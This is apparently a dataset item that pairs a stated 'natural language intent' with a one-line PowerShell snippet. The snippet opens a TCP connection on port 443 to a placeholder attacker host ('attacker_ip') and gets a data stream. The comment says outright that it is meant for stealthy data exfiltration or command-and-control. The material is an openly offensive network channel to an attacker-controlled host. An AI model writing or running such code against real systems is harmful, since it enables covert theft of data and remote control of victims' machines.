# Natural language intent:
# Using PowerShell to Interact with the Network Quietly, Establishes a network connection for quiet data transmission, useful for maintaining stealth during data exfiltration or command and control operations.

$client = New-Object Net.Sockets.TcpClient('attacker_ip', 443); $stream = $client.GetStream(); # Send and receive data
